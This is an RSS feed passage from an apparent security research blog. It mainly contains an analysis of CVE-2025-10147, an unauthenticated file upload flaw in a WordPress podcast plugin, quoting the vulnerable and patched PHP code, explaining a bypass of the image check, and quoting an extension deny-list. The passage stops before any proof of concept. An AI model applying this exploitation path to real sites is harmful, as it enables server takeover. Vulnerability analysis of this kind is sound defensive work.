1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always check user capabilities (&lt;code&gt;current_user_can&lt;/code&gt;) before performing uploads via AJAX.&lt;/li&gt;&#xA;&lt;li&gt;Always validate file type/MIME (&lt;code&gt;wp_check_filetype&lt;/code&gt; / whitelist) before saving files.&lt;/li&gt;&#xA;&lt;li&gt;Quickly update plugins when patches are available; review uploaded files and logs after disclosure.&lt;/li&gt;&#xA;&lt;li&gt;Apply the principle of least privilege and monitor for anomalous activity in media/uploads.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/embed-pdf-wpforms/vulnerability/wordpress-embed-pdf-for-wpforms-plugin-1-1-5-authenticated-subscriber-arbitrary-file-upload-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Embed PDF for WPForms Plugin &amp;lt;= 1.1.5 is vulnerable to Arbitrary File Upload&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-10147 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-05-cve-2025-10147/</link>
      <pubDate>Wed, 05 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-05-cve-2025-10147/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-05-cve-2025-10147/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Podlove Podcast Publisher&lt;/strong&gt; plugin for &lt;strong&gt;WordPress&lt;/strong&gt; has a vulnerability allowing &lt;strong&gt;arbitrary file uploads&lt;/strong&gt; due to missing file type checks in the &lt;code&gt;&#39;move_as_original_file&#39;&lt;/code&gt; function in all versions up to and including &lt;strong&gt;4.2.6&lt;/strong&gt;. This enables &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to upload arbitrary files to the affected site&amp;rsquo;s server, which can lead to &lt;strong&gt;remote code execution&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-10147&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-10147&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Arbitrary File Upload&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.2.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.2.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (10)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/podlove-podcasting-plugin-for-wordpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Podlove Podcast Publisher Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Podlove Podcast Publisher&lt;/strong&gt;: &lt;strong&gt;4.2.6&lt;/strong&gt; (vulnerable) and &lt;strong&gt;4.2.7&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to inspect and compare the differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;According to the CVE description the vulnerability is located in the &lt;code&gt;move_as_original_file()&lt;/code&gt; function&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function move_as_original_file($file)&#xA;{&#xA;    $move_new_file = @rename($file, $this-&amp;gt;original_file());&#xA;&#xA;    if (false === $move_new_file) {&#xA;        Log::get()-&amp;gt;addWarning(&#xA;            sprintf(&#xA;                __(&amp;#39;Podlove Image Cache: The downloaded image could not be moved to %s.&amp;#39;),&#xA;                $this-&amp;gt;original_file()&#xA;            )&#xA;        );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;move_as_original_file($file)&lt;/code&gt; function&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Performs a &lt;strong&gt;move of the temporary file &lt;code&gt;$file&lt;/code&gt;&lt;/strong&gt; (just downloaded from the URL)&#xA;→ to the &lt;strong&gt;fixed path&lt;/strong&gt; returned by &lt;code&gt;$this-&amp;gt;original_file()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;rename()&lt;/code&gt; in PHP = &lt;strong&gt;move file&lt;/strong&gt; (relocates the file, not copy).&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;@&lt;/code&gt; operator &lt;strong&gt;suppresses PHP warnings&lt;/strong&gt; if the operation fails.&lt;/li&gt;&#xA;&lt;li&gt;If &lt;code&gt;rename()&lt;/code&gt; returns &lt;code&gt;false&lt;/code&gt;, the plugin logs a warning.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function original_file()&#xA;{&#xA;    return implode(DIRECTORY_SEPARATOR, [&#xA;        $this-&amp;gt;upload_basedir, $this-&amp;gt;file_name(&amp;#39;original&amp;#39;)&#xA;    ]);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ Produces an &lt;strong&gt;absolute path on the server&lt;/strong&gt;, for example:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/var/www/html/wp-content/cache/podlove/6e/7262f37a8018efafa4764ea97a4c26/original.png&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$this-&amp;gt;upload_basedir&lt;/code&gt; (from &lt;code&gt;__construct()&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;Class Image {&#xA;    public function __construct($url, $file_name = &amp;#39;&amp;#39;)&#xA;    {&#xA;        // FIXME: if $file_name is empty, the url will not work. I must not treat this silently!&#xA;        $this-&amp;gt;source_url = trim($url ?? &amp;#39;&amp;#39;);&#xA;        $this-&amp;gt;file_name = sanitize_title($file_name);&#xA;&#xA;        // manually remove troublemaking characters&#xA;        // @see https://community.podlove.org/t/solved-kind-of-cover-art-disappears-caching-issue/478/&#xA;        // @see https://sendegate.de/t/problem-mit-caching-von-grafiken/2947&#xA;        if (function_exists(&amp;#39;iconv&amp;#39;)) {&#xA;            $this-&amp;gt;file_name = iconv(&amp;#39;UTF-8&amp;#39;, &amp;#39;ASCII//TRANSLIT&amp;#39;, $this-&amp;gt;file_name);&#xA;        }&#xA;        $this-&amp;gt;file_name = preg_replace(&amp;#39;~[^-a-z0-9_]&amp;#43;~&amp;#39;, &amp;#39;&amp;#39;, $this-&amp;gt;file_name);&#xA;&#xA;        $this-&amp;gt;file_extension = $this-&amp;gt;extract_file_extension();&#xA;        $this-&amp;gt;id = md5($url.$this-&amp;gt;file_name);&#xA;&#xA;        // create subdirectories to avoid too many directories in the root directory&#xA;        $id_directory = substr($this-&amp;gt;id, 0, 2).&amp;#39;/&amp;#39;.substr($this-&amp;gt;id, 2);&#xA;&#xA;        $this-&amp;gt;upload_basedir = self::cache_dir().$id_directory;&#xA;        $this-&amp;gt;upload_baseurl = content_url(&amp;#39;cache/podlove/&amp;#39;).$id_directory;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Built from &lt;code&gt;cache_dir()&lt;/code&gt; and an MD5 hash of the URL,&#xA;→ located under the directory:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp-content/cache/podlove/&amp;lt;first 2 characters&amp;gt;/&amp;lt;remaining characters&amp;gt;/&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;Here you can pass only &lt;code&gt;$url&lt;/code&gt;, for example:&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$url=&amp;quot;https://example.com/filename.php&amp;quot;&lt;/code&gt; then &lt;code&gt;$this-&amp;gt;id=&amp;quot;b1555a128239e3f59ccfb8d17e5b6c5a&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$this-&amp;gt;upload_basedir=&amp;quot;http://localhost/wp-content/cache/podlove/b1/555a128239e3f59ccfb8d17e5b6c5a&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition success open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-check&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;You can control the resulting file path.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;move_as_original_file()&lt;/code&gt; is called inside &lt;code&gt;download_source()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function download_source()&#xA;{&#xA;    $source_url = $this-&amp;gt;source_url;&#xA;    ...&#xA;    $source_domain = wp_parse_url($source_url, PHP_URL_HOST);&#xA;    $current_domain = explode(&amp;#39;:&amp;#39;, $_SERVER[&amp;#39;HTTP_HOST&amp;#39;])[0];&#xA;&#xA;    // if domains match, see if the image is part of the Publisher&#xA;    // and can be copied on the filesystem, skipping http&#xA;    if ($current_domain == $source_domain) {&#xA;        ...&#xA;        return;&#xA;    }&#xA;    // for download_url()&#xA;    require_once ABSPATH.&amp;#39;wp-admin/includes/file.php&amp;#39;;&#xA;    $result = self::download_url($this-&amp;gt;source_url);&#xA;    ...&#xA;    list($temp_file, $response) = $result;&#xA;&#xA;    if (!\Podlove\is_image($temp_file)) {&#xA;        ...&#xA;        wp_delete_file($temp_file);&#xA;        return;&#xA;    }&#xA;&#xA;    $this-&amp;gt;create_basedir();&#xA;    $this-&amp;gt;save_cache_data($response);&#xA;    $this-&amp;gt;move_as_original_file($temp_file);&#xA;    wp_delete_file($temp_file);&#xA;    $this-&amp;gt;add_donotbackup_dotfile();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This function downloads the image from the user-provided URL, validates it, then saves it into the plugin&amp;rsquo;s cache directory. Specifically:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;code&gt;$source_url&lt;/code&gt; takes the image URL provided by the user.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The function extracts the domain from &lt;code&gt;$source_url&lt;/code&gt; and the site&amp;rsquo;s current domain (&lt;code&gt;$_SERVER[&#39;HTTP_HOST&#39;]&lt;/code&gt;).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;If the two domains match → the image is considered part of the Publisher and the logic returns.&lt;/li&gt;&#xA;&lt;li&gt;If different domains → it uses &lt;code&gt;download_url()&lt;/code&gt; to fetch the file temporarily on the server.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function download_url($url, $timeout = 300, $extra_args = [])&#xA;{&#xA;    ...&#xA;    $tmpfname = wp_tempnam($url);&#xA;    if (!$tmpfname) {&#xA;        return new \WP_Error(&amp;#39;http_no_file&amp;#39;, __(&amp;#39;Could not create Temporary file.&amp;#39;));&#xA;    }&#xA;&#xA;    $default_args = [&#xA;        &amp;#39;timeout&amp;#39; =&amp;gt; $timeout,&#xA;        &amp;#39;stream&amp;#39; =&amp;gt; true,&#xA;        &amp;#39;filename&amp;#39; =&amp;gt; $tmpfname,&#xA;        &amp;#39;sslverify&amp;#39; =&amp;gt; \Podlove\get_setting(&amp;#39;website&amp;#39;, &amp;#39;ssl_verify_peer&amp;#39;) == &amp;#39;on&amp;#39;,&#xA;    ];&#xA;    $args = array_merge($default_args, $extra_args);&#xA;&#xA;    $response = wp_safe_remote_get($url, $args);&#xA;&#xA;    if (is_wp_error($response)) {&#xA;        wp_delete_file($tmpfname);&#xA;&#xA;        return $response;&#xA;    }&#xA;&#xA;    if (200 != wp_remote_retrieve_response_code($response)) {&#xA;        wp_delete_file($tmpfname);&#xA;&#xA;        return new \WP_Error(&amp;#39;http_404&amp;#39;, trim(wp_remote_retrieve_response_message($response)));&#xA;    }&#xA;&#xA;    return [$tmpfname, $response];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;download_url()&lt;/code&gt; fetches the content from the URL into a temporary file on the server and returns &lt;strong&gt;that file path&lt;/strong&gt; along with the &lt;strong&gt;response&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Checks whether the downloaded file is a valid image with &lt;code&gt;\Podlove\is_image()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;function is_image($file)&#xA;{&#xA;    $type = get_image_type($file);&#xA;    $mime = get_image_mime_type($type);&#xA;&#xA;    return substr($mime, 0, 5) == &amp;#39;image&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;In the vulnerable version, &lt;code&gt;is_image()&lt;/code&gt; only performs a &lt;strong&gt;MIME type&lt;/strong&gt; check — it gets the MIME type and verifies whether it starts with &amp;ldquo;image&amp;rdquo;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;A file that is crafted to mimic image headers (for example, a &lt;code&gt;.php&lt;/code&gt; file with the first few bytes of a PNG) can bypass this check 😬&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;function is_image($file, $filename = &amp;#34;&amp;#34;)&#xA;{&#xA;    // simple PHP based checks&#xA;    $type = get_image_type($file);&#xA;    $mime = get_image_mime_type($type);&#xA;    $mime_is_image = substr($mime, 0, 5) == &amp;#39;image&amp;#39;;&#xA;&#xA;    // more checks using WP helpers&#xA;    if (!$filename) {&#xA;      $filename = basename($file);&#xA;    }&#xA;    &#xA;    $check = wp_check_filetype_and_ext($file, $filename);&#xA;    $ext = isset($check[&amp;#39;ext&amp;#39;]) &amp;amp;&amp;amp; $check[&amp;#39;ext&amp;#39;] ? strtolower($check[&amp;#39;ext&amp;#39;]) : null;&#xA;    $wp_type = isset($check[&amp;#39;type&amp;#39;]) &amp;amp;&amp;amp; $check[&amp;#39;type&amp;#39;] ? strtolower($check[&amp;#39;type&amp;#39;]) : null;&#xA;&#xA;    $wp_type_looks_correct = stripos($wp_type, &amp;#39;image/&amp;#39;) === 0;&#xA;    &#xA;    // denielist some exts for extra safety&#xA;    $danger_exts = [&#xA;      &amp;#39;php&amp;#39;, &amp;#39;php3&amp;#39;, &amp;#39;php4&amp;#39;, &amp;#39;php5&amp;#39;, &amp;#39;phtml&amp;#39;, &amp;#39;phar&amp;#39;, &amp;#39;pl&amp;#39;, &amp;#39;py&amp;#39;, &amp;#39;rb&amp;#39;, &amp;#39;cgi&amp;#39;, &amp;#39;asp&amp;#39;, &amp;#39;aspx&amp;#39;, &amp;#39;jsp&amp;#39;,&#xA;    ];&#xA;&#xA;    $ext_looks_dangerous = empty($ext) || in_array($ext, $danger_exts, true);&#xA;&#xA;    return $mime_is_image &amp;amp;&amp;amp; !$ext_looks_dangerous &amp;amp;&amp;amp; $wp_type_looks_correct; &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The patched version adds stricter checks:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Keeps the original MIME check (&lt;code&gt;$mime_is_image&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;Adds checks using the WordPress helper &lt;a href=&#34;https://developer.wordpress.org/reference/functions/wp_check_filetype_and_ext/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;&lt;/a&gt; to match file extension and actual MIME type&lt;/li&gt;&#xA;&lt;li&gt;If there is no filename provided, it uses &lt;code&gt;basename()&lt;/code&gt; for the check&lt;/li&gt;&#xA;&lt;li&gt;Denies a list of dangerous extensions (&lt;code&gt;php&lt;/code&gt;, &lt;code&gt;phar&lt;/code&gt;, &lt;code&gt;py&lt;/code&gt;, &lt;code&gt;jsp&lt;/code&gt;, etc.) via &lt;code&gt;$danger_exts&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Combines three conditions: MIME must be an image, extension must not be dangerous, and WP must recognize the type as an image&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Moves the temporary file to the final location using &lt;code&gt;move_as_original_file($temp_file)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;&lt;code&gt;download_source()&lt;/code&gt; is invoked from &lt;code&gt;podlove_handle_cache_files()&lt;/code&gt; when the source image does not exist&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function podlove_handle_cache_files()&#xA;{&#xA;    $source_url = \Podlove\PHP\hex2str(podlove_get_query_var(&amp;#39;podlove_image_cache_url&amp;#39;));&#xA;    ...&#xA;&#xA;    $image = new Image($source_url, $file_name);&#xA;&#xA;    if (!$image-&amp;gt;source_exists()) {&#xA;        $image-&amp;gt;download_source();&#xA;    }&#xA;    ...&#xA;}&#xA;&#xA;function podlove_get_query_var($var_name)&#xA;{&#xA;    if (isset($_GET[$var_name])) {&#xA;        return $_GET[$var_name];&#xA;    }&#xA;&#xA;    return get_query_var($var_name);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;podlove_handle_cache_files()&lt;/code&gt; takes the &lt;code&gt;podlove_image_cache_url&lt;/code&gt; parameter from the GET request, then decodes it with &lt;code&gt;hex2str()&lt;/code&gt; to convert from hex format to a string.&#xA;=&amp;gt; The &lt;code&gt;podlove_image_cache_url&lt;/code&gt; parameter must be provided as hex.&lt;/p&gt;&#xA;&lt;p&gt;Then it initializes the &lt;strong&gt;Image&lt;/strong&gt; object which creates the cache storage path and performs downloading of the remote URL to the server.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;podlove_handle_cache_files()&lt;/code&gt; is registered as a callback for the action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp&amp;#39;, &amp;#39;podlove_handle_cache_files&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Meaning this function is called on every WordPress request.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; 